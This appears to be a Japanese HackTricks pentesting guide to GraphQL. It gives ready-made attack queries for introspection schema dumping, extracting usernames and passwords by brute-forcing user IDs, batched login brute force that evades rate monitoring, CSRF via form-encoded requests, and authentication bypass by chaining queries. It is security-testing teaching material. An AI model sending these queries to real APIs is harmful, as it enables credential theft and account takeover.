# GraphQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## はじめに

GraphQLはREST APIの代替として機能します。REST APIでは、クライアントはバックエンドデータベースからデータをクエリするために複数のリクエストをAPIの異なるエンドポイントに送信する必要があります。GraphQLでは、バックエンドをクエリするために1つのリクエストのみを送信する必要があります。これは、複数のリクエストをAPIに送信する必要がないため、はるかにシンプルです。

## GraphQL

新しい技術が登場するにつれて、新しい脆弱性も登場します。**デフォルトでは**、GraphQLは**認証を実装していません**。これは、開発者が実装する必要があることを意味します。つまり、デフォルトではGraphQLは誰でもクエリでき、機密情報は認証されていない攻撃者に利用可能です。

ディレクトリブルートフォース攻撃を実行する際には、次のパスを追加してGraphQLインスタンスをチェックしてください。

* _/graphql_
* _/graphiql_
* _/graphql.php_
* _/graphql/console_

<figure><img src="../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

オープンなGraphQLインスタンスを見つけたら、**どのクエリをサポートしているかを知る必要があります**。これは、内省システムを使用して行うことができます。詳細については、こちらを参照してください：[**GraphQL: A query language for APIs.**\
It’s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so…](https://graphql.org/learn/introspection/)

### フィンガープリント

ツール[**graphw00f**](https://github.com/dolevf/graphw00f)は、サーバーで使用されているGraphQLエンジンを検出し、セキュリティ監査人に役立つ情報を表示することができます。

### 基本的な列挙

GraphQLは通常、GET、POST（x-www-form-urlencoded）、POST(json)をサポートしています。

**query={\_\_schema{types{name,fields{name\}}\}}**

このクエリでは、使用されているすべてのタイプの名前を見つけることができます。

![](<../../.gitbook/assets/image (202).png>)

**query={\_\_schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind\}}\}}\}}}**

このクエリでは、すべてのタイプ、そのフィールド、およびその引数（および引数のタイプ）を抽出することができます。これは、データベースをクエリする方法を知るために非常に役立ちます。

![](<../../.gitbook/assets/image (207) (3).png>)

**エラー**

エラーが表示されるかどうかを知ることは興味深いです。エラーは有用な情報を提供する可能性があります。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**スキーマの列挙によるデータベースのスキーマの特定**

GraphQLエンドポイントは、スキーマの情報を提供するためにIntrospectionと呼ばれる機能を持っています。この機能を利用すると、データベースのスキーマを列挙することができます。

以下のクエリを使用して、スキーマの情報を取得できます。

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

このクエリをGraphQLエンドポイントに送信すると、データベースのスキーマに関する情報が返されます。これには、データベース内のすべての型の名前が含まれます。

この情報を使用して、データベースのスキーマを分析し、潜在的な脆弱性や攻撃の手がかりを見つけることができます。
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最後のコード行は、GraphQLからすべてのメタ情報（オブジェクト名、パラメータ、タイプなど）をダンプするGraphQLクエリです。

![](<../../.gitbook/assets/image (206).png>)

もしintrospectionが有効になっている場合、[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)を使用してGUIですべてのオプションを表示することができます。

### クエリング

データベース内に保存されている情報の種類がわかったので、いくつかの値を**抽出**してみましょう。

introspectionで、**直接クエリを実行できるオブジェクト**（存在するだけではクエリできません）を見つけることができます。次の画像では、"_queryType_"が"_Query_"と呼ばれ、"_Query_"オブジェクトのフィールドの1つが"_flags_"であり、これもオブジェクトのタイプです。したがって、flagオブジェクトをクエリできます。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

クエリ"_flags_"のタイプが"_Flags_"であることに注意してください。このオブジェクトは以下のように定義されています：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_"オブジェクトは**name**と**value**で構成されていることがわかります。したがって、次のクエリですべてのフラグの名前と値を取得できます：
```javascript
query={flags{name, value}}
```
注意してください。クエリする**オブジェクト**が次の例のように**文字列**などの**プリミティブな型**である場合は、次のようにクエリすることができます。

![](<../../.gitbook/assets/image (441).png>)
```javascript
query={hiddenFlags}
```
別の例では、"_Query_"タイプオブジェクト内に2つのオブジェクトがある場合があります: "_user_"と"_users_"。
これらのオブジェクトは検索に引数が必要ない場合、欲しいデータを要求するだけで**それらからすべての情報を取得**することができます。このインターネットの例では、保存されたユーザー名とパスワードを抽出することができます。

![](<../../.gitbook/assets/image (208).png>)

しかし、この例ではそれを試みると、次の**エラー**が表示されます。

![](<../../.gitbook/assets/image (210).png>)

どうやら、何らかの方法で"_**uid**_"という名前の引数を使用して検索を行っているようです。
とにかく、私たちはすでにそれを知っていました。[基本的な列挙](graphql.md#basic-enumeration)のセクションでは、必要なすべての情報を表示するクエリが提案されていました: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

そのクエリを実行したときに提供された画像を読むと、"_**user**_"には型が_Int_の"_**uid**_"という**arg**があることがわかります。

したがって、軽い**uid**ブルートフォースを実行すると、_**uid**=**1**_でユーザー名とパスワードが取得されることがわかりました:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

注意してください。私は"_**user**_"と"_**password**_"の**parameters**を要求できることを**発見**しました。なぜなら、存在しないものを探そうとすると(`query={user(uid:1){noExists}}`)、次のエラーが表示されるからです。

![](<../../.gitbook/assets/image (213).png>)

そして、**列挙フェーズ**中に、"_**dbuser**_"オブジェクトには"_**user**_"と"_**password**_"というフィールドがあることがわかりました。

**クエリ文字列ダンプトリック（@BinaryShadow\_さんに感謝）**

もし、`query={theusers(description: ""){username,password}}`のように文字列型で検索できる場合、空の文字列で検索すると、すべてのデータが**ダンプ**されます。（_この例はチュートリアルの例とは関係ありません。この例では、"**theusers**"という名前のStringフィールドの"**description**"を使用して検索できると仮定します。_）

GraphQLは比較的新しい技術であり、スタートアップや大企業の間で徐々に注目を集めています。デフォルトでは認証が不足しているだけでなく、GraphQLエンドポイントはIDORなどの他のバグにも脆弱性があります。

### 検索

この例では、メールアドレスと名前で識別される**人物**と、名前と評価で識別される**映画**のデータベースを想像してください。**人物**は他の**人物**と**友達**になることができ、人物は**映画を持つ**ことができます。

名前で人物を検索し、そのメールアドレスを取得することができます。
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
あなたは名前で人を検索し、彼らが購読している映画を取得することができます。
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
次に、人物の`subscribedMovies`の`name`を取得する方法が示されていることに注目してください。

また、**同時に複数のオブジェクトを検索する**こともできます。この場合、2つの映画を検索します。
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
または、**エイリアスを使用して複数の異なるオブジェクトの関係**もあります:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### ミューテーション

**ミューテーションは、サーバーサイドでの変更を行うために使用されます。**

**インスペクション**では、**宣言されたミューテーション**を見つけることができます。次の画像では、"_MutationType_"が"_Mutation_"と呼ばれ、"_Mutation_"オブジェクトにはミューテーションの名前（この場合は"_addPerson_"など）が含まれています。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

この例では、メールと名前で識別される**人物**と、名前と評価で識別される**映画**のデータベースを想像してください。**人物**は他の**人物**と**友達**になることができ、人物は**映画を持つ**ことができます。

データベース内に**新しい映画**を作成するためのミューテーションは、次のようになります（この例ではミューテーションは`addMovie`と呼ばれています）：
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**注意してください、クエリ内でデータの値と型が示されています。**

また、**mutation**によって**persons**を**作成**することもあります（この例では`addPerson`と呼ばれます）。友達やファイルを持つ人物を作成する場合、友達やファイルは事前に存在している必要があります。
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### 1つのAPIリクエストでバッチングブルートフォース

この情報は[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)から取得されました。\
**異なる認証情報を持つ多くのクエリを同時に送信**して認証するGraphQL API。これはクラシックなブルートフォース攻撃ですが、GraphQLのバッチング機能により、1つのHTTPリクエストに複数のログイン/パスワードペアを送信することが可能になりました。このアプローチにより、外部のレート監視アプリケーションはすべてが正常であり、パスワードを推測しようとするブルートフォースボットが存在しないと思わせることができます。

以下に、アプリケーションの認証リクエストの最も単純なデモンストレーションを示します。**3つの異なるメール/パスワードペアを同時に**送信しています。もちろん、同じ方法で1つのリクエストに数千を送信することも可能です。

![](<../../.gitbook/assets/image (182) (1).png>)

レスポンスのスクリーンショットからわかるように、最初と3番目のリクエストは_null_を返し、_error_セクションに対応する情報を反映しています。**2番目のミューテーションは正しい認証**データを持ち、レスポンスには正しい認証セッショントークンが含まれています。

![](<../../.gitbook/assets/image (119) (1).png>)

## イントロスペクションなしのGraphQL

**graphqlエンドポイントでのイントロスペクションの無効化**が増えています。ただし、graphqlが予期しないリクエストを受け取った場合にgraphqlがスローするエラーは、[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)などのツールによってスキーマの大部分を再作成するのに十分です。

さらに、Burp Suiteの拡張機能[**GraphQuail**](https://github.com/forcesunseen/graphquail)は、Burpを介して通過するGraphQL APIリクエストを**監視**し、新しいクエリごとに内部のGraphQL **スキーマ**を**構築**します。また、スキーマをGraphiQLとVoyagerに公開することもできます。この拡張機能は、イントロスペクションクエリを受け取った場合に偽のレスポンスを返します。その結果、GraphQuailはAPI内で使用できるすべてのクエリ、引数、およびフィールドを表示します。詳細については、[**こちらを参照してください**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

## GraphQLでのCSRF

CSRFが何であるかわからない場合は、次のページを読んでください：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

そこでは、CSRFトークンなしで**構成されたいくつかのGraphQLエンドポイント**を見つけることができます。

GraphQLリクエストは通常、Content-Type **`application/json`**を使用してPOSTリクエストで送信されます。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
ただし、ほとんどのGraphQLエンドポイントは**`form-urlencoded`のPOSTリクエスト**もサポートしています：
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
したがって、前述のようなCSRFリクエストは**プリフライトリクエストなしで**送信されるため、CSRFを悪用してGraphQLで**変更**を行うことが可能です。

ただし、Chromeの`samesite`フラグの新しいデフォルトクッキー値は`Lax`です。これは、クッキーがサードパーティのWebからのGETリクエストでのみ送信されることを意味します。

また、**クエリリクエスト**も**GETリクエスト**として送信することができ、GETリクエストではCSRFトークンが検証されない場合があります。

また、[**XS-Search**](../../pentesting-web/xs-search.md) **攻撃**を悪用することで、ユーザーの資格情報を悪用してGraphQLエンドポイントからコンテンツを外部に漏洩させることが可能です。

詳細については、[**こちらの元の投稿**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)をご覧ください。

## GraphQLにおける認証

エンドポイントで定義された多くのGraphQL関数は、リクエスターの認証のみをチェックし、認可は行いません。

クエリの入力変数を変更することで、機密のアカウント詳細が[漏洩](https://hackerone.com/reports/792927)する可能性があります。

ミューテーションは、他のアカウントデータを変更しようとしてアカウント乗っ取りにつながる可能性さえあります。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLにおける認証のバイパス

[クエリのチェーン](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)を使用すると、弱い認証システムをバイパスできます。

以下の例では、操作が「forgotPassword」であり、それに関連するforgotPasswordクエリのみが実行されるはずです。これは、末尾にクエリを追加することでバイパスできます。この場合、"register"というクエリと、新しいユーザーとして登録するためのユーザー変数を追加します。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## 漏洩したGraphQLの構造

インロスペクションが無効になっている場合は、ウェブサイトのソースコードを確認してみてください。クエリはしばしばブラウザに事前に読み込まれたJavaScriptライブラリとして存在します。これらの事前に書かれたクエリは、各オブジェクトと関数のスキーマと使用方法について強力な情報を明らかにすることがあります。開発者ツールの`Sources`タブでは、クエリが保存されている場所を列挙するためにすべてのファイルを検索できます。時には、管理者保護されたクエリさえも既に公開されていることがあります。
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## ツール

### 脆弱性スキャナー

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): スキーマを取得し、機密データを検索し、認証をテストし、スキーマをブルートフォース攻撃し、指定されたタイプへのパスを見つけるために使用できるツールキット。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): スタンドアロンまたは[Burp拡張](https://github.com/doyensec/inql)として使用できます。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLIクライアントとしても使用でき、攻撃を自動化するためにも使用できます。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): GraphQLスキーマ内の特定のタイプに到達するさまざまな方法をリストするツール。

### クライアント

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUIクライアント
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUIクライアント

### 自動テスト

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLの説明ビデオ: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考文献

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
